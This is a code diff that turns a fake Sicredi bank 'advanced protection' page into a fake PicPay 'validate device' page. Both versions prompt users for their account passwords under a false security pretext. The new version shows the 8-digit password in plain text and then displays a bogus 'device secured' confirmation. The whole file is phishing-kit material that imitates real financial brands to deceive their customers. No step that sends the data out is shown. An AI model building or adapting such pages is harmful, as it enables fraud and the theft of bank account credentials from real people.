@@ -3,25 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sicredi | Proteção Avançada</title>
+    <title>PicPay | Validar Dispositivo</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
         
         :root {
-            --sicredi-green: #3fb43f;
-            --sicredi-dark-green: #2d822d;
-            --sicredi-text: #333333;
-            --sicredi-light-bg: #f9f9f9;
+            --picpay-green: #21C25E;
+            --picpay-dark: #111111;
+            --picpay-gray: #F5F5F5;
         }
 
         body, html {
             height: 100%;
             margin: 0;
             background-color: white;
-            font-family: 'Roboto', sans-serif;
-            color: var(--sicredi-text);
+            font-family: 'Inter', sans-serif;
+            color: var(--picpay-dark);
             overflow: hidden;
         }
 
@@ -29,210 +28,193 @@
             display: none;
             flex-direction: column;
             height: 100%;
+            padding: 0 24px;
         }
 
         .step-active {
             display: flex;
         }
 
-        .input-group {
-            position: relative;
-            width: 100%;
-            margin-top: 2rem;
-        }
-
         .custom-input {
             width: 100%;
-            border-bottom: 2px solid #e2e8f0;
-            padding: 12px 0;
-            font-size: 1.25rem;
-            font-weight: 500;
-            color: var(--sicredi-text);
+            border-bottom: 2px solid #E5E7EB;
+            padding: 16px 0;
+            font-size: 1.5rem;
+            font-weight: 600;
+            letter-spacing: 0.1em;
+            color: var(--picpay-dark);
             background: transparent;
             outline: none;
             transition: border-color 0.3s;
         }
 
         .custom-input:focus {
-            border-color: var(--sicredi-green);
+            border-color: var(--picpay-green);
         }
 
-        .btn-sicredi {
-            background-color: var(--sicredi-green);
+        .btn-picpay {
+            background-color: var(--picpay-green);
             color: white;
-            font-weight: 700;
-            padding: 18px;
-            border-radius: 16px;
+            font-weight: 600;
+            padding: 16px;
+            border-radius: 50px;
             width: 100%;
-            text-transform: uppercase;
+            font-size: 1rem;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(63, 180, 63, 0.2);
         }
 
-        .btn-sicredi:disabled {
-            background-color: #e2e8f0;
-            color: #94a3b8;
-            box-shadow: none;
+        .btn-picpay:disabled {
+            background-color: #E5E7EB;
+            color: #9CA3AF;
         }
 
-        .progress-bar {
+        .progress-indicator {
             height: 4px;
-            background: #e2e8f0;
+            background: #F3F4F6;
             width: 100%;
             position: fixed;
-            top: 64px;
+            top: 60px;
             left: 0;
         }
 
-        .progress-fill {
+        .progress-bar {
             height: 100%;
-            background: var(--sicredi-green);
+            background: var(--picpay-green);
             width: 50%;
-            transition: width 0.4s ease;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .badge-security {
-            background: rgba(63, 180, 63, 0.1);
-            color: var(--sicredi-green);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
+        /* Estilo para deixar a senha visível por padrão */
+        input[type="text"].password-style {
+            -webkit-text-security: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- Header Fixo -->
-    <header class="h-[64px] bg-white border-b flex items-center px-5 fixed top-0 w-full z-10">
+    <!-- Header -->
+    <header class="h-[60px] flex items-center px-4 justify-between fixed top-0 w-full bg-white z-20">
         <button onclick="prevStep()" class="p-2">
-            <i data-lucide="chevron-left" class="w-6 h-6 text-green-600"></i>
+            <i data-lucide="arrow-left" class="w-6 h-6 text-gray-800"></i>
         </button>
-        <div class="flex-1 text-center font-black italic text-2xl text-green-600 pr-8">sicredi</div>
+        <div class="flex items-center gap-1">
+            <svg width="24" height="24" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="512" cy="512" r="512" fill="#21C25E"/>
+                <path d="M700 350H324V674H700V350Z" fill="white"/>
+            </svg>
+            <span class="font-bold text-xl tracking-tight">PicPay</span>
+        </div>
+        <div class="w-10"></div> <!-- Spacer -->
     </header>
 
-    <div class="progress-bar">
-        <div id="progress-fill" class="progress-fill"></div>
+    <div class="progress-indicator">
+        <div id="progress-bar" class="progress-bar"></div>
     </div>
 
-    <!-- ETAPA 1: SENHA DE ENTRADA -->
-    <div id="step1" class="step-container step-active px-8 pt-24">
-        <div class="flex flex-col items-center text-center">
-            <div class="badge-security mb-4">
-                <i data-lucide="shield" class="w-3 h-3"></i> PROTEÇÃO CONTRA ATAQUES
-            </div>
-            <h1 class="text-2xl font-bold">Senha de Entrada</h1>
-            <p class="text-gray-500 mt-2 text-sm leading-relaxed">
-                Confirme sua senha de acesso à conta para validar sua identidade.
+    <!-- ETAPA 1: SENHA DE 8 DÍGITOS -->
+    <div id="step1" class="step-container step-active pt-28">
+        <div class="flex flex-col">
+            <h1 class="text-2xl font-bold mb-2">Confirme sua senha</h1>
+            <p class="text-gray-500 text-sm mb-8 leading-relaxed">
+                Para sua segurança, digite sua senha de acesso de 8 dígitos para continuar.
             </p>
 
-            <div class="input-group">
-                <input type="text" id="pass-entry" class="custom-input" placeholder="Digite sua senha de entrada" autocomplete="off">
-                <p class="text-[10px] text-gray-400 mt-2 text-left w-full uppercase font-bold tracking-tighter">Aceita letras e números</p>
+            <div class="relative mt-4">
+                <input type="text" 
+                       id="pass-8-digits" 
+                       class="custom-input password-style" 
+                       placeholder="00000000" 
+                       maxlength="8" 
+                       inputmode="numeric"
+                       autocomplete="off">
+                <p id="counter" class="text-xs font-medium text-gray-400 mt-3 text-right">0 / 8 dígitos</p>
             </div>
         </div>
 
         <div class="mt-auto pb-10">
-            <button onclick="nextStep()" id="btn-next" disabled class="btn-sicredi">Próximo</button>
+            <button onclick="nextStep()" id="btn-next" disabled class="btn-picpay">Continuar</button>
         </div>
     </div>
 
-    <!-- ETAPA 2: SENHA DE TRANSAÇÃO -->
-    <div id="step2" class="step-container px-8 pt-24">
-        <div class="flex flex-col items-center text-center">
-            <div class="badge-security mb-4">
-                <i data-lucide="shield-alert" class="w-3 h-3"></i> VALIDAÇÃO ADICIONAL
-            </div>
-            <h1 class="text-2xl font-bold">Senha de Transação</h1>
-            <p class="text-gray-500 mt-2 text-sm leading-relaxed">
-                Por segurança, informe sua senha de transação para ativar a blindagem da conta.
-            </p>
-
-            <div class="input-group">
-                <input type="text" id="pass-trans" class="custom-input" placeholder="Digite sua senha de transação" autocomplete="off">
-                <p class="text-[10px] text-gray-400 mt-2 text-left w-full uppercase font-bold tracking-tighter">Assinatura eletrônica / Transação</p>
-            </div>
-        </div>
-
-        <div class="mt-auto pb-10">
-            <button onclick="activateSecurity()" id="btn-activate" disabled class="btn-sicredi">Ativar segurança na conta</button>
-        </div>
+    <!-- ETAPA 2: CARREGANDO / PROCESSANDO -->
+    <div id="step2" class="step-container pt-28 items-center text-center">
+        <div class="w-16 h-16 border-4 border-gray-100 border-t-[#21C25E] rounded-full animate-spin mb-6"></div>
+        <h1 class="text-xl font-bold">Validando informações</h1>
+        <p class="text-gray-500 text-sm mt-2">Isso leva apenas alguns instantes...</p>
     </div>
 
     <!-- TELA DE SUCESSO -->
-    <div id="step-success" class="step-container px-8 pt-24 items-center justify-center text-center">
-        <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mb-6 shadow-xl shadow-green-100">
-            <i data-lucide="check-circle-2" class="text-white w-12 h-12"></i>
+    <div id="step-success" class="step-container pt-28 items-center text-center">
+        <div class="w-20 h-20 bg-[#21C25E] rounded-full flex items-center justify-center mb-6">
+            <i data-lucide="shield-check" class="text-white w-12 h-12"></i>
         </div>
-        <h1 class="text-2xl font-bold text-gray-800">Segurança Ativada!</h1>
-        <p class="text-gray-500 mt-4 leading-relaxed">
-            Sua conta agora está protegida contra ataques e acessos não autorizados.
+        <h1 class="text-2xl font-bold">Dispositivo Seguro</h1>
+        <p class="text-gray-500 mt-4 px-4">
+            A proteção avançada foi aplicada com sucesso. Sua conta PicPay está protegida.
         </p>
         <div class="mt-10 w-full">
-            <button onclick="location.reload()" class="btn-sicredi">Voltar ao início</button>
+            <button onclick="location.reload()" class="btn-picpay">Entendido</button>
         </div>
     </div>
 
     <script>
+        // Inicializa ícones
         lucide.createIcons();
 
         let currentStep = 1;
-        const passEntry = document.getElementById('pass-entry');
-        const passTrans = document.getElementById('pass-trans');
+        const passInput = document.getElementById('pass-8-digits');
         const btnNext = document.getElementById('btn-next');
-        const btnActivate = document.getElementById('btn-activate');
-        const progressFill = document.getElementById('progress-fill');
+        const progressBar = document.getElementById('progress-bar');
+        const counter = document.getElementById('counter');
 
-        // Validação Etapa 1
-        passEntry.addEventListener('input', (e) => {
-            btnNext.disabled = e.target.value.length < 3;
-        });
+        // Lógica do Input de 8 dígitos
+        passInput.addEventListener('input', (e) => {
+            // Garante que apenas números sejam digitados
+            e.target.value = e.target.value.replace(/\D/g, '');
+            
+            const len = e.target.value.length;
+            counter.innerText = `${len} / 8 dígitos`;
+            
+            // Habilita o botão apenas com 8 dígitos
+            btnNext.disabled = len !== 8;
 
-        // Validação Etapa 2
-        passTrans.addEventListener('input', (e) => {
-            btnActivate.disabled = e.target.value.length < 3;
+            if(len === 8) {
+                counter.classList.add('text-green-500');
+            } else {
+                counter.classList.remove('text-green-500');
+            }
         });
 
         function nextStep() {
             if (currentStep === 1) {
                 document.getElementById('step1').classList.remove('step-active');
                 document.getElementById('step2').classList.add('step-active');
-                progressFill.style.width = '100%';
+                progressBar.style.width = '100%';
                 currentStep = 2;
-                setTimeout(() => passTrans.focus(), 100);
+
+                // Simulação de processamento
+                setTimeout(() => {
+                    document.getElementById('step2').classList.remove('step-active');
+                    document.getElementById('step-success').classList.add('step-active');
+                    document.querySelector('.progress-indicator').style.display = 'none';
+                }, 2500);
             }
         }
 
         function prevStep() {
-            if (currentStep === 2) {
+            if (currentStep === 1) {
+                // Ação de voltar para o app original (simulação)
+                console.log("Voltando...");
+            } else if (currentStep === 2) {
                 document.getElementById('step2').classList.remove('step-active');
                 document.getElementById('step1').classList.add('step-active');
-                progressFill.style.width = '50%';
+                progressBar.style.width = '50%';
                 currentStep = 1;
-            } else if (currentStep === 1) {
-                // Comportamento de voltar (opcional)
-                console.log("Sair ou voltar");
             }
         }
 
-        function activateSecurity() {
-            // Simulação de carregamento
-            btnActivate.innerHTML = `<span class="inline-block animate-spin mr-2">◌</span> Processando...`;
-            btnActivate.disabled = true;
-
-            setTimeout(() => {
-                document.getElementById('step2').classList.remove('step-active');
-                document.getElementById('step-success').classList.add('step-active');
-                document.querySelector('.progress-bar').style.display = 'none';
-                currentStep = 3;
-            }, 1500);
-        }
-
-        // Foco inicial
-        window.onload = () => passEntry.focus();
+        // Foco automático ao abrir
+        window.onload = () => passInput.focus();
     </script>
 </body>
 </html>
